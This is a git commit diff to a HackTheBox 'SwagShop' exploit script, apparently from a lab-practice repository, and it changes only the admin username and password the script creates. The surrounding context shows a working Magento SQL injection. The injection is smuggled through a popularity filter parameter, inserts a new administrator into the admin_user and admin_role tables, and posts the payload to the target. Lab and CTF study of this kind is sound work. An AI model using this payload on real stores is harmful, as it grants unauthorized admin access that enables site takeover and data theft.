99210f6f15563a700880ec4b88cd03d3f895b44d
vastopol <classicunix@gmail.com>
2019-09-14 22:20:16 -0700

    htb

--- hackthebox/machines/SwagShop/37977.py
+++ hackthebox/machines/SwagShop/37977.py
@@ -27,7 +27,7 @@ INSERT INTO `admin_user` (`firstname`, `lastname`,`email`,`username`,`password`,
 INSERT INTO `admin_role` (parent_id,tree_level,sort_order,role_type,user_id,role_name) VALUES (1,2,0,'U',(SELECT user_id FROM admin_user WHERE username = '{username}'),'Firstname');
 """
 
-query = q.replace("\n", "").format(username="forme", password="forme")
+query = q.replace("\n", "").format(username="yourmom", password="yourmom")
 pfilter = "popularity[from]=0&popularity[to]=3&popularity[field_expr]=0);{0}".format(query)
 
 # e3tibG9jayB0eXBlPUFkbWluaHRtbC9yZXBvcnRfc2VhcmNoX2dyaWQgb3V0cHV0PWdldENzdkZpbGV9fQ decoded is{{block type=Adminhtml/report_search_grid output=getCsvFile}}
@@ -37,6 +37,6 @@ r = requests.post(target_url,
                         "forwarded": 1})
 if r.ok:
     print "WORKED"
-    print "Check {0}/admin with creds forme:forme".format(target)
+    print "Check {0}/admin with creds yourmom:yourmom".format(target)
 else:
     print "DID NOT WORK"
